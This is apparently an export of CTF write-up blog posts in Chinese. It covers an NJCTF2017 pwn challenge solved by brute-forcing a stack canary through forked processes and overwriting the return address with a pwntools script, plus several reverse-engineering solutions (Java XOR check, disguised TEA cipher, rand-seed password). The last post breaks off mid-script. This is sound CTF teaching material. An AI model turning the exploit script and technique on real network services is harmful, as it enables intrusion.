[{"id":"93d43ea1d4ca04bfd8b5b6e2f9278ee0","title":"NJCTF2017:messagerWP","content":"Messager1.环境启动：第一道例题来自2017年的NJCTF，该程序本身就能通过socket进行通信，不需要用socat进行绑定，所以直接运行即可，端口为5555。\n$ echo \"Flag&#123;V2VDaGF0X3RoeXNjODMyXlhE&#125;\" > flag\n$ ./messager\n验证：\nnetstat -anp | grep messager\n2.程序分析：1.查看程序保护：首先file，checksec看一下程序：\n\n可以看到开了Canary和NX保护\n2.程序静态分析：用IDA打开分析程序：\n首先看main( )函数：\n__int64 __fastcall main(__int64 a1, char **a2, char **a3)\n&#123;\n  int optval; // [rsp+0h] [rbp-10h] BYREF\n  __pid_t pid; // [rsp+4h] [rbp-Ch]\n  unsigned __int64 v6; // [rsp+8h] [rbp-8h]\n\n  v6 = __readfsqword(0x28u);\n  read_flag();\n  puts(\"[+]start..\");\n  addr.sa_family = 2;\n  *(_WORD *)addr.sa_data = htons(0x15B3u);\n  *(_DWORD *)&amp;addr.sa_data[2] = htonl(0);\n  len = 16;\n  addr_len = 16;\n  pid = 0;\n  puts(\"[+]socket..\");\n  dword_602140 = socket(2, 1, 0);\n  if ( dword_602140 &lt; 0 )\n  &#123;\n    perror(\"socket\");                 //perror()函数的功能是打印一个系统错误信息\n    return 0xFFFFFFFFLL;\n  &#125;\n  optval = 1;\n  setsockopt(dword_602140, 1, 2, &amp;optval, 4u);\n  puts(\"[+]bind..\");\n  if ( bind(dword_602140, &amp;addr, len) &lt; 0 )\n  &#123;\n    perror(\"bind error\");\n    return 0xFFFFFFFFLL;\n  &#125;\n  puts(\"[+]listen..\");\n  if ( listen(dword_602140, 1024) &lt; 0 )\n  &#123;\n    perror(\"listen\");\n    return 0xFFFFFFFFLL;\n  &#125;\n  while ( 1 )\n  &#123;\n    fd = accept(dword_602140, &amp;stru_602130, &amp;addr_len);\n    if ( fd == -1 )\n    &#123;\n      perror(\"accept\");\n      return 0xFFFFFFFFLL;\n    &#125;\n    send(fd, \"Welcome!\\n\", 9uLL, 0);\n    pid = fork();\n    if ( pid == -1 )\n    &#123;\n      perror(\"fork\");\n      return 0xFFFFFFFFLL;\n    &#125;\n    if ( !pid )\n      break;\n    close(fd);\n  &#125;\n  signal(14, handler);\n  alarm(3u);\n  if ( (unsigned int)interaction() )\n  &#123;\n    if ( send(fd, \"Message receive failed\\n\", 0x19uLL, 0) == -1 )\n      goto LABEL_14;\n  &#125;\n  else if ( send(fd, \"Message received!\\n\", 0x12uLL, 0) == -1 )\n  &#123;\nLABEL_14:\n    perror(\"send\");\n    return 0xFFFFFFFFLL;\n  &#125;\n  return 0LL;\n&#125;\n\n第8行处可看出刚开始就调用了一个函数，这个函数的作用是读取flag文件\nssize_t read_flag()\n&#123;\n  int fd; // [rsp+Ch] [rbp-4h]\n\n  fd = open(\"./flag\", 0);\n  if ( fd &lt; 0 )\n  &#123;\n    perror(\"open flag failed\");\n    exit(0);\n  &#125;\n  return read(fd, &amp;unk_602160, 0x64uLL);\n&#125;\nhttps://magnificent-syrup-61f.notion.site/C-c034b8439f1c4c7db260ad6c40897363从第九行开始的就是常规的调用socket，bind，listen三个函数作为TCP服务器端程序的调用，关键在于37行的while循环，其调用的fork函数，大致意思就是当服务器接受到客户端的连接请求时从父进程分裂出一个子进程，根据fork函数的特性(此函数的变量pid装着fork的返回值)，主进程会继续while循环等待新的客户端连接，而分裂出的子进程则会跳出while循环调用interaction函数，与客户端进行对接。https://magnificent-syrup-61f.notion.site/fork-85adbf6101c14b2e9278840b3e5841df\n__int64 interaction()\n&#123;\n  __int64 result; // rax\n  char s[104]; // [rsp+10h] [rbp-70h] BYREF\n  unsigned __int64 v2; // [rsp+78h] [rbp-8h]\n\n  v2 = __readfsqword(0x28u);\n  printf(\"csfd = %d\\n\", (unsigned int)fd);\n  bzero(s, 0x64uLL);        //该函数的功能是将指定内存块的前n个字节全部设置为零\n  if ( (unsigned int)recv(fd, s, 0x400uLL, 0) == -1 )\n  &#123;\n    perror(\"recv\");\n    result = 0xFFFFFFFFLL;\n  &#125;\n  else\n  &#123;\n    printf(\"Message come: %s\", s);\n    fflush(stdout);       //清空文件缓冲区\n    result = 0LL;\n  &#125;\n  return result;\n&#125;\n\n分析interaction函数可以发现字符串变量s在栈上申请的空间是104字节，而在接收函数recv处却申请了1024字节的空间，这里明显造成了栈的溢出。所以现在要做的就是分析如何利用这个漏洞。\n已知条件：\n\ncanary的大小为指针大小，64位程序，指针为8字节。\ncanary的低位为0x00\nfork函数的子进程是父进程的克隆\n\n通常情况下，对Canaries进行爆破是不太可能的。在32位下，除去低位固定的“\\x00”，还有0x100^3&#x3D;16 777 216种情况，64位则更多。另外，爆破意味着大量的崩溃，而程序重启后Canaries的值也会重新生成。但是同一个进程内包括复刻的子进程，它们的Canaries是不会变的，且子进程崩溃不会影响到主进程，这就给了我们爆破的机会。\n确认了fork出来的子函数的栈溢出不会导致主程序崩溃，所以每次fork出来的子程序cananry都等于主函数的canary，那么我们就可以一个字节一个字节的进行爆破根据进程崩溃与否来判断填充上去的字节是否正确。获得Canaries的值后，我们就可以在溢出时保持其不变，并覆盖返回地址，获得flag。\n最后就是确认要返回的地址是多少：\n这里是通过c语言网络编程知识确定的，已知send函数是向对方发送数据，而flag就在buf里面，所以我们的目的返回地址为：400BC6.\n.text:0000000000400BC6 sub_400BC6      proc near\n.text:0000000000400BC6 ; __unwind &#123;\n.text:0000000000400BC6                 push    rbp\n.text:0000000000400BC7                 mov     rbp, rsp\n.text:0000000000400BCA                 mov     eax, cs:fd\n.text:0000000000400BD0                 mov     ecx, 0          ; flags\n.text:0000000000400BD5                 mov     edx, 64h ; 'd'  ; n\n.text:0000000000400BDA                 mov     esi, offset unk_602160 ; buf\n.text:0000000000400BDF                 mov     edi, eax        ; fd\n.text:0000000000400BE1                 call    _send\n.text:0000000000400BE6                 nop\n.text:0000000000400BE7                 pop     rbp\n.text:0000000000400BE8                 retn\n.text:0000000000400BE8 ; &#125; // starts at 400BC6\n\n3.Payload：\n遇到的问题：\ncanary后面存放的是ebp的值，再后面才是要返回的地址。\npython3不支持前后连接不同类型的字符串,send里面既有字符串又有地址,解决方法是在地址(p64方法)后面加.decode(“iso-8859-1”)\n\n\n\nfrom pwn import  *\n\ndef leak_canary():\n    global canary\n    canary = \"\\x00\"\n    while len(canary) &lt; 8:\n        for x in range(256):\n            io = remote(\"127.0.0.1\",5555)\n            io.recv()\n\n            io.send(\"A\"*104 + canary + chr(x))\n            try:\n                io.recv()\n                canary += chr(x)\n                break\n            except:\n                continue\n            finally:\n                io.close()\n\ndef pwn():\n    io = remote(\"127.0.0.1\",5555)\n    io.recv()\n\n    io.send(\"A\"*104 + canary + \"A\"*8 + p64(0x400bc6).decode(\"iso-8859-1\"))\n    print (io.recvline())\n\nif __name__=='__main__':\n    leak_canary()\n    pwn()\n\n\n","slug":"PWN/NJCTF2017-messagerWP","date":"2022-03-15T05:59:29.000Z","categories_index":"PWN","tags_index":"WP","author_index":"Big Devils"},{"id":"dbf28d0c1562fa16371756c5d1c38cce","title":"2022年2月PragyanCTF比赛记录","content":"\n\n\nReverse\n考点\n\n\n\nOak\njava源代码，算法逆向\n\n\n\n\n\n\nOak\n题目描述\nJust little understanding of java would be enough Oak.class。\n\n\n\n\n源代码：\n  //\n// Source code recreated from a .class file by IntelliJ IDEA\n// (powered by FernFlower decompiler)\n//\n\npublic class Oak &#123;\n    static long[] data = new long[]&#123;28767L, 24418L, 25470L, 29771L, 26355L, 31349L, 13032L, 30456L, 14663L, 27592L, 8916L, 29409L, 7348L, 17474L, 5124L, 3345L, 49357L, 61058L, 65159L, 53773L, 67886L, 72426L, 103728L, 158125L, 179542L, 166504L, 212101L, 282674L, 320873L, 329272L, 400021L, 479881L, 535081L, 599886L, 662294L, 731441L, 831284L, 947032L, 1021482L&#125;;\n\n    public Oak() &#123;\n    &#125;\n\n    public static int t_helper(int var0, int[] var1) &#123;\n        if (var1[var0] != -1) &#123;\n            return var1[var0];\n        &#125; else if (var0 == 0) &#123;\n            var1[0] = 0;\n            return var1[0];\n        &#125; else if (var0 == 1) &#123;\n            var1[1] = 1;\n            return var1[1];\n        &#125; else if (var0 == 2) &#123;\n            var1[2] = 3;\n            return var1[2];\n        &#125; else &#123;\n            var1[var0] = 3 * t_helper(var0 - 1, var1) - 3 * t_helper(var0 - 2, var1) + t_helper(var0 - 3, var1);\n            return var1[var0];\n        &#125;\n    &#125;\n\n    public static int t(int var0) &#123;\n        int[] var1 = new int[var0 + 1];\n\n        for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123;\n            var1[var2] = -1;\n        &#125;\n\n        return t_helper(var0, var1);\n    &#125;\n\n    public static void main(String[] args) &#123;\n        String[] var0= &#123;\"falg\"&#125;;\n        if (var0.length != 1) &#123;\n            System.out.println(\"Usage: [flag]\");\n        &#125; else &#123;\n            if (check(var0[0])) &#123;\n                System.out.println(\"Correct!\");\n            &#125; else &#123;\n                System.out.println(\"Incorrect\");\n            &#125;\n\n        &#125;\n    &#125;\n\n    public static long[] conv(String var0) &#123;\n        long[] var1 = new long[var0.length()];\n\n        for(int var2 = 0; var2 &lt; var0.length(); ++var2) &#123;\n            var1[var2] = (long)((var0.charAt(var2) &lt;&lt; 8) + var0.charAt((var2 + 1) % var0.length()));\n        &#125;         //var1的各元素有falg字符串的当前元素左移8位和后面一个元素取余串长组成\n\n        return var1;\n    &#125;\n\n    public static boolean check(String var0) &#123;\n        long[] var1 = conv(var0);\n\n        for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123;\n            if (data[var2] != (var1[var2] ^ (long)t(var2 * var2))) &#123;\n                return false;\n            &#125;\n        &#125;\n\n        return true;\n    &#125;\n&#125;\n\n解体思路：\nmain函数判断输入，要求输入一个flag，而且只能输入一个字符串\n\n\n\n加密后的数据存在了data里面\n static long[] data = new long[]&#123;28767L, 24418L, 25470L, 29771L, 26355L, 31349L, 13032L, 30456L, 14663L, 27592L, 8916L, 29409L, 7348L, 17474L, 5124L, 3345L, 49357L, 61058L, 65159L, 53773L, 67886L, 72426L, 103728L, 158125L, 179542L, 166504L, 212101L, 282674L, 320873L, 329272L, 400021L, 479881L, 535081L, 599886L, 662294L, 731441L, 831284L, 947032L, 1021482L&#125;;\n\n随后调用check函数\n public static boolean check(String var0) &#123;\n        long[] var1 = conv(var0);\n\n        for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123;\n            if (data[var2] != (var1[var2] ^ (long)t(var2 * var2))) &#123;\n                return false;\n            &#125;\n        &#125;\n\n        return true;\n    &#125;\n 大致思路分两块，第一块将输入的flag传到conv函数变形，然后与t函数返回值进行异或操作，最后与data里的值判断是否相等\n\n所以先逆t函数：\n public static int t(int var0) &#123;\n    int[] var1 = new int[var0 + 1];\n    \n    for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123;\n        var1[var2] = -1;\n    &#125;\n    \n    return t_helper(var0, var1);\n&#125;\n t函数又调用了t_helper函数\n public static int t_helper(int var0, int[] var1) &#123;\n        if (var1[var0] != -1) &#123;\n            return var1[var0];\n        &#125; else if (var0 == 0) &#123;\n            var1[0] = 0;\n            return var1[0];\n        &#125; else if (var0 == 1) &#123;\n            var1[1] = 1;\n            return var1[1];\n        &#125; else if (var0 == 2) &#123;\n            var1[2] = 3;\n            return var1[2];\n        &#125; else &#123;\n            var1[var0] = 3 * t_helper(var0 - 1, var1) - 3 * t_helper(var0 - 2, var1) + t_helper(var0 - 3, var1);\n            return var1[var0];\n        &#125;\n    &#125;\n 看似复杂其实可以注意到传到t函数的值实际上是死的，分析它没有任何意义，逆向算法时直接照搬就行\n\n接着分析第一块：\n public static long[] conv(String var0) &#123;\n        long[] var1 = new long[var0.length()];\n\n        for(int var2 = 0; var2 &lt; var0.length(); ++var2) &#123;\n            var1[var2] = (long)((var0.charAt(var2) &lt;&lt; 8) + var0.charAt((var2 + 1) % var0.length()));\n        &#125;         //var1的各元素有falg字符串的当前元素左移8位和后面一个元素取余串长组成\n\n        return var1;\n    &#125;\n 一开始的思路是从最后元素逆推回来，但是很麻烦，这里其实可以利用位运算的特性直接解，因为每个加密后的元素是先左移8位在加上后面那个未加密的元素，那么我们直接把前面八位置零就可以轻松获得后面一位的值用这种方法依次类推，flag就出来了\n\n\nexp编写：逆向思路大概是逆t→与data异或→所有元素除了后8位，其他位置零：\npublic class exp &#123;\n    static long[] data = new long[]&#123;28767L, 24418L, 25470L, 29771L, 26355L, 31349L, 13032L, 30456L, 14663L, 27592L, 8916L, 29409L, 7348L, 17474L, 5124L, 3345L, 49357L, 61058L, 65159L, 53773L, 67886L, 72426L, 103728L, 158125L, 179542L, 166504L, 212101L, 282674L, 320873L, 329272L, 400021L, 479881L, 535081L, 599886L, 662294L, 731441L, 831284L, 947032L, 1021482L&#125;;\n    public static int t_helper(int var0, int[] var1) &#123;\n        if (var1[var0] != -1) &#123;\n            return var1[var0];\n        &#125; else if (var0 == 0) &#123;\n            var1[0] = 0;\n            return var1[0];\n        &#125; else if (var0 == 1) &#123;\n            var1[1] = 1;\n            return var1[1];\n        &#125; else if (var0 == 2) &#123;\n            var1[2] = 3;\n            return var1[2];\n        &#125; else &#123;\n            var1[var0] = 3 * t_helper(var0 - 1, var1) - 3 * t_helper(var0 - 2, var1) + t_helper(var0 - 3, var1);\n            return var1[var0];\n        &#125;\n    &#125;\n\n    public static int t(int var0) &#123;\n        int[] var1 = new int[var0 + 1];\n\n        for(int var2 = 0; var2 &lt; var1.length; ++var2) &#123;\n            var1[var2] = -1;\n        &#125;\n\n        return t_helper(var0, var1);\n    &#125;\n\n    public static long[] conv(String var0) &#123;\n        long[] var1 = new long[var0.length()];\n\n        for(int var2 = 0; var2 &lt; var0.length(); ++var2) &#123;\n            var1[var2] = (long)((var0.charAt(var2) &lt;&lt; 8) + var0.charAt((var2 + 1) % var0.length()));\n        &#125;         //var1的各元素有falg字符串的当前元素左移8位和后面一个元素取余串长组成\n\n        return var1;\n    &#125;\n\n    public static void main(String[] args)&#123;\n        long[] var1 = new long[data.length];\n        for(int var2 = 0; var2 &lt; data.length; ++var2) &#123;\n            var1[var2] = (data[var2] ^ (long) t(var2 * var2));\n            System.out.print(var1[var2]);\n            System.out.print(\",\");\n        &#125;\n        \n\n        &#125;\n\n    &#125;\n\n前面的解密可以用题目的代码，后面置零就用python了：\nflag=\"\"\nrflag=[28767,24419,25460,29798,26235,31536,12402,29233,12647,26417,12654,28212,13436,31839,24430,28224,16461,19763,13101,11568,12390,26207,24394,18996,13430,30273,16735,24407,22369,24885,13663,24360,10281,10543,12124,23676,31804,15485,32112]\nfor i in range(39):\n    flag+=chr(rflag[i]&amp;127)\n\nt=(len(flag)-1)%len(flag)\nflag=flag[t:]+flag[:t]      //循环右移\nprint(flag)\n\np_ctf{0r1g1n4|n@M3-0f_J4vA_Wa5()&#x2F;|&lt;}\n","slug":"比赛记录/2022年2月PragyanCTF比赛记录","date":"2022-03-14T16:50:11.000Z","categories_index":"比赛记录","tags_index":"WP","author_index":"Big Devils"},{"id":"9c74912da0a2a9c3bea7b6b4717c1a49","title":"2022年2月SUSCTF比赛记录","content":"\n\n\nReverse\n考点\n\n\n\nDigitalCircuits\nexe→py，tea\n\n\n\n\n\n\nDigitalCircuitsexe→py:\n只要一看到这个图标就晓得大概率是py文件被打包成了exe，而且一般打包后的文件较大。直接用脚本解包。\npyinstxtractor.py DigitalCircuits.exe\n\n\n找到pyc文件之后在线网站反汇编就行\n算法分析：总体预览：反汇编后的代码为：\n#!/usr/bin/env python\n# visit https://tool.lu/pyc/ for more information\nimport time\n\ndef f1(a, b):\n    if a == '1' and b == '1':      //相当于，按位与操作\n        return '1'\n    return '0'\n\ndef f2(a, b):\n    if a == '0' and b == '0':     //相当于，按位或操作\n        return '0'\n    return '1'\n\ndef f3(a):                        //相当于，按位非操作\n    if a == '1':\n        return '0'\n    if a == '0':\n        return '1'\n\ndef f4(a, b):\n    return f2(f1(a, f3(b)), f1(f3(a), b))    //相当于，按位异或操作\n\ndef f5(x, y, z):\n    s = f4(f4(x, y), z)\n    c = f2(f1(x, y), f1(z, f2(x, y)))\n    return (s, c)\n\ndef f6(a, b):\n    ans = ''\n    z = '0'\n    a = a[::-1]\n    b = b[::-1]\n    for i in range(32):\n        ans += f5(a[i], b[i], z)[0]\n        z = f5(a[i], b[i], z)[1]\n\n    return ans[::-1]\n\ndef f7(a, n):                         //按位左移\n    return a[n:] + '0' * n\n\ndef f8(a, n):                         //按位右移\n    return n * '0' + a[:-n]\n\ndef f9(a, b):\n    ans = ''\n    for i in range(32):\n        ans += f4(a[i], b[i])\n\n    return ans\n\ndef f10(v0, v1, k0, k1, k2, k3):\n    s = '00000000000000000000000000000000'\n    d = '10011110001101110111100110111001'\n    for i in range(32):\n        s = f6(s, d)\n        v0 = f6(v0, f9(f9(f6(f7(v1, 4), k0), f6(v1, s)), f6(f8(v1, 5), k1)))\n        v1 = f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3)))\n\n    return v0 + v1\n\nk0 = '0100010001000101'.zfill(32)    //zfill() 方法返回指定长度的字符串，原字符串右对齐，前面填充0。\nk1 = '0100000101000100'.zfill(32)\nk2 = '0100001001000101'.zfill(32)\nk3 = '0100010101000110'.zfill(32)\nflag = input('please input flag:')\nif flag[0:7] != 'SUSCTF&#123;' or flag[-1] != '&#125;':      //判断输入是否为SUSCTF&#123;&#125;包裹\n    print('Error!!!The formate of flag is SUSCTF&#123;XXX&#125;')\n    time.sleep(5)\n    exit(0)\nflagstr = flag[7:-1]\nif len(flagstr) != 24:                //实际flag长度为24\n    print('Error!!!The length of flag 24')\n    time.sleep(5)\n    exit(0)\nres = ''\nfor i in range(0, len(flagstr), 8):    //加密\n    v0 = flagstr[i:i + 4]\n    v0 = bin(ord(flagstr[i]))[2:].zfill(8) + bin(ord(flagstr[i + 1]))[2:].zfill(8) + bin(ord(flagstr[i + 2]))[2:].zfill(8) + bin(ord(flagstr[i + 3]))[2:].zfill(8)\n    v1 = bin(ord(flagstr[i + 4]))[2:].zfill(8) + bin(ord(flagstr[i + 5]))[2:].zfill(8) + bin(ord(flagstr[i + 6]))[2:].zfill(8) + bin(ord(flagstr[i + 7]))[2:].zfill(8)\n    res += f10(v0, v1, k0, k1, k2, k3)\n\nif res == '001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111':\n    print('True')\nelse:\n    print('False')\ntime.sleep(5)\n\n这里的难点就是识别加密算法，前面之所以定义这么多函数就是掩盖其加密算法的特征，从函数走向分析每一个for的用处(看注释)，分析78行到82行的加密循环\n加密循环分析：for i in range(0, len(flagstr), 8):    //加密\n    v0 = flagstr[i:i + 4]\n    v0 = bin(ord(flagstr[i]))[2:].zfill(8) + bin(ord(flagstr[i + 1]))[2:].zfill(8) + bin(ord(flagstr[i + 2]))[2:].zfill(8) + bin(ord(flagstr[i + 3]))[2:].zfill(8)\n    v1 = bin(ord(flagstr[i + 4]))[2:].zfill(8) + bin(ord(flagstr[i + 5]))[2:].zfill(8) + bin(ord(flagstr[i + 6]))[2:].zfill(8) + bin(ord(flagstr[i + 7]))[2:].zfill(8)\n    res += f10(v0, v1, k0, k1, k2, k3)\n\nbin函数特征\n\n每轮循环的v0都是flag的值，每次存4个元素\n通过bin函数以字符串的形式返回每个元素二进制表达形式\n但是bin函数会自作主张的在前面加上0b，所以通过[2:]来切片将0b去掉\n再通过zfill补充去掉的前两位\n\n\nfor循环一次做8个元素，前四个元素放在了放在v0，后四个元素放在v1\nv0和v1都是以字符串的形式保存这元素的二进制表达\n调用f10加密函数，参数为v0，v1和四个key\n\n这里分析一下特征：密钥为128位，明文总共64位，分成两个32位\n符合这个条件的为TEA加密算法。\n为了进一步确认，分析f10函数：\nf10()函数：(TEA加密函数)def f10(v0, v1, k0, k1, k2, k3):\n    s = '00000000000000000000000000000000'\n    d = '10011110001101110111100110111001'\n    for i in range(32):\n        s = f6(s, d)\n        v0 = f6(v0, f9(f9(f6(f7(v1, 4), k0), f6(v1, s)), f6(f8(v1, 5), k1)))\n        v1 = f6(v1, f9(f9(f6(f7(v0, 4), k2), f6(v0, s)), f6(f8(v0, 5), k3)))\n\n定义两个变量：分别为s和d，联想到TEA加密算法也是同样的做法(定义sum和detal两个变量)，delta变量放着的是黄黄金分割律数字转换的一个数字 2654435769 （0x9E3779B9）,但这个函数是用二进制的形式表达的计算机换算一下\n\n这里就可以锁定加密算法使用的是TEA了\n确认算法后就可以直接写解密脚本了：\ndef TeaDecode(enc,k):\n    v0 = enc[0]\n    v1 = enc[1]\n    n = (delta * 32) &amp; 0xFFFFFFFF\n    for i in range(32):\n        v1 -= ((v0 &lt;&lt; 4) + k[2]) ^ (v0 + n) ^ ((v0 >> 5) + k[3])\n        v1 &amp;= 0xFFFFFFFF\n        v0 -= ((v1 &lt;&lt; 4) + k[0]) ^ (v1 + n) ^ ((v1 >> 5) + k[1])\n        v0 &amp;= 0xFFFFFFFF\n        n -= delta\n    return (v0, v1)\n\nenflag = '001111101000100101000111110010111100110010010100010001100011100100110001001101011000001110001000001110110000101101101000100100111101101001100010011100110110000100111011001011100110010000100111'\nenflag = [int(enflag[i:i + 32],2) for i in range(0, len(enflag), 32)]\n\nk = [0] * 4\nk[0] = int('0100010001000101'.zfill(32), 2)    #int(字符串或数字,进制(默认10进制))\nk[1] = int('0100000101000100'.zfill(32), 2)\nk[2] = int('0100001001000101'.zfill(32), 2)\nk[3] = int('0100010101000110'.zfill(32), 2)\ndelta = int('10011110001101110111100110111001', 2)\n\nflag = b''\nfor i in range(0,len(enflag),2):        #第三个参数为步进值\n    ans = TeaDecode(enflag[i:i + 2], k)\n    flag += ans[0].to_bytes(4, 'big') + ans[1].to_bytes(4, 'big')\n\nprint(b'SUSCTF&#123;' + flag + b'&#125;')\n\n","slug":"比赛记录/2022年2月SUSCTF比赛记录","date":"2022-03-14T13:33:40.000Z","categories_index":"比赛记录","tags_index":"WP","author_index":"Big Devils"},{"id":"56919547bee931a87d7135086187449a","title":"伪随机数逆向题实例","content":"根据算法推出种子的逆向实例：\n题目附件\nrandom.rar\n\n\n1.前期信息探查：1.EXEinfo：64位，无壳，ELF文件\n\n2.运行一下：\n1.IDA分析：__int64 __fastcall main(int a1, char **a2, char **a3)\n&#123;\n  int i; // [rsp+Ch] [rbp-24h]\n  int j; // [rsp+10h] [rbp-20h]\n  unsigned int seed; // [rsp+14h] [rbp-1Ch]\n  int v7; // [rsp+18h] [rbp-18h]\n  int v8; // [rsp+1Ch] [rbp-14h]\n  void *v9; // [rsp+20h] [rbp-10h]\n  void *v10; // [rsp+28h] [rbp-8h]\n\n  v9 = malloc(0x3E8uLL);\n  v10 = malloc(0x3E8uLL);\n  seed = time(0LL);\n  srand(seed);\n  puts(\"Welcome to my reverse!!!\\\\n\");\n  printf(\"Waiting\");\n  fflush(stdout);\n  for ( i = 0; i &lt;= 29; ++i )\n  &#123;\n    v7 = rand();\n    sleep(v7 % (4 * i + 2));\n    putchar('-');\n    fflush(stdout);           // 函数作用为清空缓冲区，这个参数的意思是键盘输入\n  &#125;\n  putchar(10);\n  printf(\"username:\");\n  __isoc99_scanf(\"%s\", v9);\n  printf(\"password:\");\n  __isoc99_scanf(\"%s\", v10);\n  printf(\"Checking\");\n  fflush(stdout);\n  for ( j = 0; j &lt;= 29; ++j )\n  &#123;\n    v8 = rand();\n    sleep(v8 % (2 * j + 1));\n    putchar(45);\n    fflush(stdout);\n  &#125;\n  putchar(10);\n  sub_4008C1(v9);\n  sub_400901(v9);\n  sub_4009B2(v9);\n  sub_400A33(v9, v10);\n  return sub_400C23(v9, v10);\n\n主函数接收了两个值，一个username，一个password，分别被40~44行的五个函数作为参数，而剩下的两个循环没啥用，纯粹浪费分析时间。\n1.第一个子函数分析__int64 __fastcall sub_4008C1(__int64 username)\n&#123;\n  int i; // [rsp+1Ch] [rbp-4h]\n  for ( i = 0; i &lt;= 100 &amp;&amp; *(_BYTE *)(i + username); ++i );\n  return sub_400866((unsigned int)i);\n&#125;\n\n这个子函数就一个循环，然后掉转到另一个子函数，循环的终止条件有两个，一个是i&gt;100,一个是username的地址加i个偏移等于’\\0’，所以i也就是username的串长。接着看sub_400866函数：\n__int64 __fastcall sub_400866(int a1)\n&#123;\n  __int64 result; // rax\n\n  if ( 4 * (a1 >> 2) != a1 || 4 * (a1 >> 4) == a1 >> 2 || !(a1 >> 3) || (result = (unsigned int)(a1 >> 4), (_DWORD)result) )\n  &#123;\n    puts(\"Wrong username or password!!!\\\\n\");\n    exit(0);\n  &#125;\n  return result;\n&#125;\n\n这个函数作用大概是要求串长满足某种条件的，想知道哪些串长满足如下条件也很简单，就是穷举1~100，代入公式就行\nresult = 0\nfor i in range(100):\n    result = (i >> 4)\n    if ( 4 * (i >> 2) != i or 4 * (i >> 4) == i >> 2 or not(i >> 3) or result):\n        continue\n    else :\n        print(i)\n\n\n可以看到满足条件的长度只有8和12\n第一个函数的作用到这就分析出来了，就是用来判断username串的串长\n2.第二个函数分析：__int64 __fastcall sub_400901(int *username)\n&#123;\n  __int64 result; // rax\n  __int64 v2; // [rsp+18h] [rbp-18h]\n  __int64 v3; // [rsp+20h] [rbp-10h]\n  __int64 v4; // [rsp+28h] [rbp-8h]\n\n  v2 = *username;\n  v3 = username[1];\n  v4 = username[2];\n  if ( v2 - v3 + v4 != 1885764216 || v3 + 2 * (v4 + v2) != 0x22F241C1FLL || (result = 0x31CD156AC3A69DC4LL, v3 * v4 != 0x31CD156AC3A69DC4LL) )\n  &#123;\n    puts(\"Wrong username or password!!!\\\\n\");\n    exit(0);\n  &#125;\n  return result;\n&#125;\n\nresult变量在这里啥用也没有，直接忽略。\nusername被分成三段，分别放入v2、v3、v4，这三个值分别满足if里的三个等式，也就是要解一个三元一次方程组\nfrom z3 import *\nx = Real('x')     #v2\ny = Real('y')     #v3\nz = Real('z')     #v4\ns = Solver()\ns.add(x - y + z == 1885764216)\ns.add(y + 2*(x + z) == 9380830239)\ns.add(y * z == 3588548026377346500)\nif s.check() == sat:\n    result = s.model()\n    print (result)\nelse:\n    print('no result')\n\n\n将这些值转成十六进制：\nv2 = 0x6D73 7469\nv3 = 0x6F72 6265\nv4 = 0x7265 6874\n\n这里需要注意的是这些的值是以小端的形式存在内存中，重新组合转换成字符应为：\nv2 = 0x6974736d  ->  itsm\nv3 = 0x6562726f  ->  ebro\nv4 = 0x74686572  ->  ther\n\n由此得出username的值为“itsmebrother”\n3.第三个函数分析：__int64 __fastcall sub_4009B2(__int64 a1)\n&#123;\n  __int64 result; // rax\n  int i; // [rsp+1Ch] [rbp-4h]\n\n  for ( i = 0; ; ++i )\n  &#123;\n    result = *(unsigned __int8 *)(i + a1);\n    if ( !(_BYTE)result )\n      break;\n    if ( (*(char *)(i + a1) &lt;= 96 || *(char *)(i + a1) > 122) &amp;&amp; *(_BYTE *)(i + a1) != 95 )\n    &#123;\n      puts(\"Wrong username or password!!!\\\\n\");\n      exit(0);\n    &#125;\n  &#125;\n  return result;\n&#125;\n\n函数作用：判断输入的字符是否为小写字母和‘_’\n4.第四个函数分析：__int64 __fastcall sub_400A33(_DWORD *username, char *password)\n&#123;\n  __int64 result; // rax\n  int i; // [rsp+18h] [rbp-28h]\n  int v4; // [rsp+1Ch] [rbp-24h]\n  int v5; // [rsp+20h] [rbp-20h]\n  int v6; // [rsp+24h] [rbp-1Ch]\n  int v7; // [rsp+28h] [rbp-18h]\n  int v8; // [rsp+2Ch] [rbp-14h]\n\n  for ( i = 0; password[i]; ++i )               // 判断password是否由，大小写字母和数字组成\n  &#123;\n    if ( (password[i] &lt;= 96 || password[i] > 122)\n      &amp;&amp; (password[i] &lt;= 64 || password[i] > 90)\n      &amp;&amp; (password[i] &lt;= 47 || password[i] > 57) )\n    &#123;\n      puts(\"Wrong username or password!!!\\\\n\");\n      exit(0);\n    &#125;\n  &#125;\n  srand(username[1] + *username + username[2]);\n  v4 = *(_DWORD *)password;\n  if ( v4 - rand() != 385125110 )\n  &#123;\n    puts(\"Wrong username or password!!!\\\\n\");\n    exit(0);\n  &#125;\n  v5 = *((_DWORD *)password + 1);\n  if ( v5 - rand() != 537582108 )\n  &#123;\n    puts(\"Wrong username or password!!!\\\\n\");\n    exit(0);\n  &#125;\n  v6 = *((_DWORD *)password + 2);\n  if ( v6 - rand() != 58160324 )\n  &#123;\n    puts(\"Wrong username or password!!!\\\\n\");\n    exit(0);\n  &#125;\n  v7 = *((_DWORD *)password + 3);\n  if ( v7 - rand() != 1606651445 )\n  &#123;\n    puts(\"Wrong username or password!!!\\\\n\");\n    exit(0);\n  &#125;\n  v8 = *((_DWORD *)password + 4);\n  result = (unsigned int)(v8 - rand());\n  if ( (_DWORD)result != 183286517 )\n  &#123;\n    puts(\"Wrong username or password!!!\\\\n\");\n    exit(0);\n  &#125;\n  return result;\n&#125;\n\n这里调用的是rand函数，paseword的值减去生成的随机数等于一个值，而srand设置的随机数种子是已知的利用这个特点我们就可以解出password的值。\n先利用已知的随机数种子求出生成的随机数：(操作系统不同rand函数的处理方式可能有差别)\n一开始是在Windows的环境下跑的结果解不出来：\n\n这是个linux程序还是使用linux的gcc：\n\n生成可执行文件会报错，说做加法的时候出现溢出情况，不过不影响，因为源程序也会溢出。\n\n0x5664ad74\n0x283e9d1a\n0x6ee9f96c\n0x36fc1ff\n0x665b8a42\n\n编写exp来获取password的值：\nrpassword = []\nrpassword.append(0x16F48AF6)\nrpassword.append(0x200ADA1C)\nrpassword.append(0x37774C4)\nrpassword.append(0x5FC38E35)\nrpassword.append(0xAECBAF5)\nrand = 